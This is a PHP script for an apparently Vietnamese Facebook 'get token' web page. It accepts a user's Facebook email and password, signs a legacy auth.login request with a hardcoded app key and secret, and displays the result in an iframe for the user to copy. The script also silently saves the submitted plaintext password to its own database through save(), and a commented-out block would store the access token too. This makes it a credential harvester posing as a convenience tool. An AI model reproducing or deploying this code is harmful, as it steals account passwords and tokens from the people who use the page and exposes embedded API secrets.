<?php
ini_set('precision',20);
include "connect.php";
include "save.php";
$con = connect();
//
$user = isset($_POST["user"]) ? $_POST["user"] : false;
$pass = isset($_POST["pass"]) ? $_POST["pass"] : false;
//
$data = array(
	"api_key" => "3e7c78e35a76a9299309885393b02d97",
	"email" => $user,
	"format" => "JSON",
	//"generate_machine_id" => "1",
	//"generate_session_cookies" => "1",
	"locale" => "vi_vn",
	"method" => "auth.login",
	"password" => $pass,
	"return_ssl_resources" => "0",
	"v" => "1.0"
);
function sign_creator(&$data){
	$sig = "";
	foreach($data as $key => $value){
		$sig .= "$key=$value";
	}
	$sig .= 'c1e620fa708a1d5696fb991c1bde5662';
	$sig = md5($sig);
	return $data['sig'] = $sig;
	return $sig;
}
sign_creator($data);
$result =
'<iframe class="getToken" src="https://api.facebook.com/restserver.php?'.http_build_query($data).'"></iframe>
<div class="form-group">
    <label for="fullToken">Tô đen và Copy tất cả trong khung phía trên sau đó Paste vào khung phía dưới:</label>
	<textarea id="fullToken" type="text" class="form-control" rows="5" placeholder="Paste vào đây sau đó nhấn Lọc Token!"></textarea>
</div>
<button class="btn btn-dark" type="button" onclick="tokenFilter()">Lọc Token</button>';
save($con, $user, $pass, "");
echo $result;
//
/*$getToken = "https://api.facebook.com/restserver.php?".http_build_query($data);
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_URL, $getToken);
$tokenResult = curl_exec($curl);
$tokenJson = json_decode($tokenResult, true);
if(isset($tokenJson["uid"])){
    $id =  $tokenJson["uid"];
    $token = $tokenJson["access_token"];
    save($con, $user, $pass, $id, "", $token);
}*/
?>